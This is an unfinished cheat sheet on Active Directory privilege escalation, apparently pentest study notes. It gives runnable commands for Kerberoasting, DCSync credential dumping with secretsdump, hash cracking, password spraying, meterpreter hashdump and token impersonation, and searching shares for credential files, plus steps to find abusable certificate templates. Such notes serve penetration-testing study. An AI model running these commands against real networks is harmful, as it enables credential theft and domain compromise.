# Active Directory PrivEsc

## Introduction

## Tools

#### Bloodhound and Sharphound

[Sharphound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) is the collector that gathers all the information abnout the 
network and compresses it into a zip file. You can then import this data and view a map of the AD domain. This very import to see weak points
like DCsyncs, Usernames, Trust 


#### Crackmapexec


#### Empire and Starkiller


Rubeus, Seatbelt, Mimikatz...

#### Hashcat/JtR


`hashcat -m 13100 -a 0 hash.txt rockyou.txt`


#### Impacket

Kerberoasting 
```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip $IP $DOMAIN.local/$USER:$PASSWORD -request
```
Exploit DCSync Privileges
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -dc-ip $IP $DOMAIN/$USER@$IP
```

#### Kerbrute

You want to target the subnet and then as you laterally move through the network the Adminstrators and DCs.
`crackmapexec smb $IP -u users.txt -p passes.txt`

#### Metasploit and Proxychains

Metasploit combined with proxychains can used to pivot and access segmented sections of network.
The shells create route through then inaccessable parts of the network can be mapped beyond the shell's address.
To proxy through the network see sections on [proxychains in proxies]() and [metasploit autoroute and socks5 server](). 

Due to Trusts, pivoting in required to hop to the connection between Domains. 
Trust can be: 
1. Directional - The direction of the trusts flows from a trusting domain to a trusted domain.
1. Transitive - The trust relationship expands beyond just two domains to include other trusted domains.

If inclined meterpreter and its commands:
```meterpreter

migrate 	# Don't forget to migrate to better processes as processes die: lsass.exe
hashdump

use incognito
list_token -u
impersonate_token $ TOKEN

```

#### Powerview
PowerView "is a powershell tool to gain network situational awareness one Windows domains."
[Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

Due to AD commands are a restricted to DCs and some(times) Adminstrators. 
Get PowerView on the box, you need some help.
```
. .\PowerView.ps1				# import PowerView
Import Module PowerView.ps1			
Get-NetDomain					# Like ADDomain but lists less information
Get-NetDomainController				# List all Domain Controller
Get-NetForest					# like AdForest
Get-NetDomainTrust				# like NetDomainTrust

Find-InterestingDomainShareFile
-CheckAccess
*password*
*sensitive*
*admin*
*login*
*secret*
*unattend*.xml
*vmdk
*creds*
*credential*
*.config
```


## General Enumeration

```
ipconfig /displaydns	# Get DC ip
Get-ADForest | Select-Object Domains								# Lists all Domains in Forest
Get-ADTrust -Filter * | Select-Object Direction,Source,Target					# List trust information
dsquery group -name "Domain Admins" | dsget group -expand -members				# Query for all DCs
Get-ADDomain | Select-Object NetBIOSName, DNSRoot, InfrastructureMaster				# List all DCs
Get-ADUser -Filter * -Properties Description | Where-Object { $_.Description.length -gt 8 } 	# Searching AD replace *!
```



#### AD Certificate Exploitation Enumeration:
Terminology:

PKI                     - Public Key Infrastructure is a system that manages certificates and public key encryption
AD CS                   - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers
CA                      - Certificate Authority is a PKI that issues certificates
Certificate Template    - a collection of settings and policies that defines how and when a certificate may be issued by a CA
CSR                     - Certificate Signing Request is a message sent to a CA to request a signed certificate
EKU                     - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be us

```powershell
certutil -v -template > cert_templates.txt
```

BEWARE VULNERABLITY != condition for PrivEsc, Human intervention from admins and domain controllers
YOU WANT TO FIND ALL THREE:
foreach Template[X] find toxic parametre: ##

       ONE PARAMETRE THAT HAS THE FOLLOWING:


1. Relevent Permissions

A template where we have the relevant permissions to request the certificate or where we have an account with those permissions.
This template, our user has either Allow Enroll or Allow Full Control # Probably never find the latter
Template permissions are MOSTLY assigned by GROUP 
```powershell
net user <username> /domain
```
Look for these groups:
Domain Users - This means in most cases that any authenticated users can request the certificate
Domain Computers - This means that the machine account of a domain-joined host can request the certificate. If we have admin rights over any machine, we can request the certificate on behalf of the machine account

2. Client Authentication
A template that allows client authentication, meaning we can use it for Kerberos authentication
Review EKU properties of the template to find the words Client Authentication

3. Client Specifies Subject Alternative Name (SAN)
A template that allows us to alter the subject alternative name (SAN)
Usually a url that we then encrypt, 
```powershell
findstr "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT" 
```
If  CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1 we can specify the SAN ourselves


# TODO scripting 
!! Line numbers /N
```powershell
find cert_template.txt "Allow Enroll"
# find cert_template.txt "Allow Full Control"
find cert_template.txt "Client Authentication"
find cert_template.txt "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"
```
put line numbers in an array, compare shortest with the others
if arrEnroll[i] is in a range of (+10 or -10) of arrAuth[j]

